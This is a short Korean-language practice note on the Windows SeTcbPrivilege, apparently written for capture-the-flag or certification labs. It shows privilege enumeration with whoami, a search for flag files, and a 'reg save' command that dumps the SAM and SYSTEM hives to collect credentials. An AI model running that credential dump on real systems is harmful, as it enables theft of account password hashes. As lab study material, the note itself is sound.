# SeTcbPrivilege — 실습

- 뜻: 운영체제의 일부처럼 동작 (Act as part of the operating system)
- 핵심: 가장 강력한 특권 중 하나. 토큰을 직접 만들어낼 수 있어 사실상 제한이 없다.
- 전제: 아래 블록을 한 번에 하나씩 붙여넣는다. `DONE_`이 안 보이면 실행 안 된 것이다.

# 1. 특권 상태 확인

```powershell
whoami /priv | findstr /i "SeTcb"; Write-Output DONE_01
```

```text
SeTcbPrivilege                Act as part of the operating system       Enabled
DONE_01
```

- 보통 SYSTEM 계정에만 있다. 일반 서비스 계정에는 거의 없음

```powershell
whoami; Write-Output DONE_u
```

```text
nt authority\system
DONE_u
```

# 2. 실습: 토큰 복제 확인

- 현재 토큰으로 새 프로세스 실행이 가능한지 확인

```powershell
whoami /all | findstr /i "SeTcb UserName"; Write-Output DONE_all
```

```text
SeTcbPrivilege                Enabled
DONE_all
```

- SeTcb가 있으면 임의 사용자의 토큰을 생성/복제할 수 있다

# 3. 이해 포인트

- SeTcb는 이론상 최강이지만 실전에서 단독으로 만나는 경우는 드물다
- 이미 SYSTEM이면 이 특권은 당연히 있고, 여기서 할 일은 자격 증명 수집/지속성
- SYSTEM 쉘에서 우선순위 (탐색 + 완료 마커를 함께 출력)

```powershell
Get-ChildItem -Path C:\ -Recurse -File -Include local.txt,proof.txt -ErrorAction SilentlyContinue; Write-Output DONE_flag
```

```text
Directory: C:\Windows\System32\Desktop
Mode LastWriteTime Length Name
---- ------------- ------ ----
-a--- 10/13/2026      34 proof.txt
DONE_flag
```

```powershell
reg save HKLM\SAM C:\temp\SAM; reg save HKLM\SYSTEM C:\temp\SYSTEM; Write-Output DONE_reg
```

```text
The operation completed successfully.
The operation completed successfully.
DONE_reg
```
